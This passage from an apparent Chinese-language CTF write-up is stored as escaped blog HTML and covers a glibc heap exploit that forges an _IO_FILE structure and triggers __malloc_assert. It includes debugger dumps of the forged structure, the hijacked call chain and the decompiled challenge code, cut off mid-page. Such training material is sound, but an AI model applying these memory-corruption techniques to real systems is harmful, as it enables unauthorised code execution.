class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *) &lt;span class=&#34;number&#34;&gt;0x562fcda56370&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_ptr = &lt;span class=&#34;number&#34;&gt;0x451&lt;/span&gt; &amp;lt;error: Cannot access memory at address &lt;span class=&#34;number&#34;&gt;0x451&lt;/span&gt;&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_end = &lt;span class=&#34;number&#34;&gt;0x7f2b2d5cc0e0&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;1120&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot; t\245\315/V&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_base = &lt;span class=&#34;number&#34;&gt;0x562fcda55290&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_base = &lt;span class=&#34;number&#34;&gt;0x562fcda55290&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_ptr = &lt;span class=&#34;number&#34;&gt;0x7f2b2d5cc840&lt;/span&gt; &amp;lt;_IO_2_1_stdout_+&lt;span class=&#34;number&#34;&gt;192&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_end = &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt; &amp;lt;error: Cannot access memory at address &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_backup_base = &lt;span class=&#34;number&#34;&gt;0x562fcda57cd0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_end = &lt;span class=&#34;number&#34;&gt;0x7f2b2d405a6d&lt;/span&gt; &amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;61&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;H\213\242\240&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _markers = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _chain = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _fileno = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _old_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _cur_column = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _vtable_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _shortbuf = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _lock = &lt;span class=&#34;number&#34;&gt;0x562fcda56000&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _codecvt = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _wide_data = &lt;span class=&#34;number&#34;&gt;0x562fcda563a0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_list = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __pad5 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _mode = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _unused2 = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;19&lt;/span&gt; times&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vtable = &lt;span class=&#34;number&#34;&gt;0x7f2b2d5c80d0&lt;/span&gt; &amp;lt;_IO_wfile_jumps+&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p _IO_file_jumps&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __dummy = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __dummy2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __finish = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43e070&lt;/span&gt; &amp;lt;_IO_new_file_finish&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __overflow = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43ee40&lt;/span&gt; &amp;lt;_IO_new_file_overflow&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __underflow = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43eb30&lt;/span&gt; &amp;lt;_IO_new_file_underflow&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __uflow = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43fde0&lt;/span&gt; &amp;lt;__GI__IO_default_uflow&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __pbackfail = &lt;span class=&#34;number&#34;&gt;0x7f2b2d441300&lt;/span&gt; &amp;lt;__GI__IO_default_pbackfail&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __xsputn = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43d680&lt;/span&gt; &amp;lt;_IO_new_file_xsputn&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __xsgetn = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43d330&lt;/span&gt; &amp;lt;__GI__IO_file_xsgetn&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seekoff = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43c960&lt;/span&gt; &amp;lt;_IO_new_file_seekoff&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seekpos = &lt;span class=&#34;number&#34;&gt;0x7f2b2d440530&lt;/span&gt; &amp;lt;_IO_default_seekpos&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __setbuf = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43c620&lt;/span&gt; &amp;lt;_IO_new_file_setbuf&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __sync = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43c4b0&lt;/span&gt; &amp;lt;_IO_new_file_sync&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __doallocate = &lt;span class=&#34;number&#34;&gt;0x7f2b2d430b90&lt;/span&gt; &amp;lt;__GI__IO_file_doallocate&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __read = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43d9b0&lt;/span&gt; &amp;lt;__GI__IO_file_read&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __write = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43cf40&lt;/span&gt; &amp;lt;_IO_new_file_write&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seek = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43c6f0&lt;/span&gt; &amp;lt;__GI__IO_file_seek&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __close = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43c610&lt;/span&gt; &amp;lt;__GI__IO_file_close&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __stat = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43cf30&lt;/span&gt; &amp;lt;__GI__IO_file_stat&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __showmanyc = &lt;span class=&#34;number&#34;&gt;0x7f2b2d4414a0&lt;/span&gt; &amp;lt;_IO_default_showmanyc&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __imbue = &lt;span class=&#34;number&#34;&gt;0x7f2b2d4414b0&lt;/span&gt; &amp;lt;_IO_default_imbue&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们看到这里对应的入口点就是 xsputn。当__malloc_assert 进行 __fxprintf 调用的时候，进行错误输出的时候，&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__fxprintf  ————》》&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;locked_vfxprintf  ————》》&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__vfprintf_internal 	————》》		//0x7f6fb038d15d &amp;lt;__vfprintf_internal+173&amp;gt;    call   *ABS*+0xab090@plt &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__strchrnul_avx2;ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__libc_cleanup_push_defer;ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x7f6fb038d1c8 &amp;lt;__vfprintf_internal+280&amp;gt;    call   qword ptr [r12 + 0x38]	//调用目标函数&amp;lt;__GI__IO_wfile_seekoff&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;下面我们直接来看题目&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#下面我们直接来看题目&#34;&gt;#&lt;/a&gt; 下面我们直接来看题目。&lt;/h3&gt;
&lt;p&gt;开始的逆向过程就不再赘述。&lt;/p&gt;
&lt;p&gt;程序确实实现了增删改查的功能，但是对于改的次数做出了严格的限制，只允许进行两次更改，而且程序没有结束功能，也就是说，我们如果想利用 io 必须触发报错__malloc_assert。由于我们只有两次修改的机会，那么其实我们已经想好了怎么做，一次用来出发报错，一次用来伪造 io 结构。&lt;/p&gt;
&lt;p&gt;我们来看程序的实现，&lt;/p&gt;
&lt;h4 id=&#34;add&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#add&#34;&gt;#&lt;/a&gt; add&lt;/h4&gt;
&lt;p&gt;在创建的 chunk 的时候，最多允许我们创建 16 个 cat，并且对 size 的大小进行了限制&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;size &amp;lt;= &lt;span class=&#34;number&#34;&gt;0x417&lt;/span&gt; || size &amp;gt; &lt;span class=&#34;number&#34;&gt;0x46F&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;只允许的 largebin 范围的堆块的创建&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 idx; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; size; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;plz input your cat idx:\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  idx = getint();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( idx &amp;gt; &lt;span class=&#34;number&#34;&gt;0xF&lt;/span&gt; || &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[idx] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;invalid!\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;plz input your cat size:\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    size = getint();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( size &amp;lt;= &lt;span class=&#34;number&#34;&gt;0x417&lt;/span&gt; || size &amp;gt; &lt;span class=&#34;number&#34;&gt;0x46F&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;invalid size!\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[idx] = &lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[idx] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        size_list[idx] = size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;plz input your content:\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[idx], size_list[idx]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;error!\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;同时，因为使用 了 calloc 函数，会对我们申请出来的 chunk 进行一个初始化。read 允许我们输入空字符。&lt;/p&gt;
&lt;p&gt;接下来我们看看删除&lt;/p&gt;
&lt;h4 id=&#34;delete&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#delete&#34;&gt;#&lt;/a&gt; delete&lt;/h4&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;del&lt;/span&gt;&lt;span 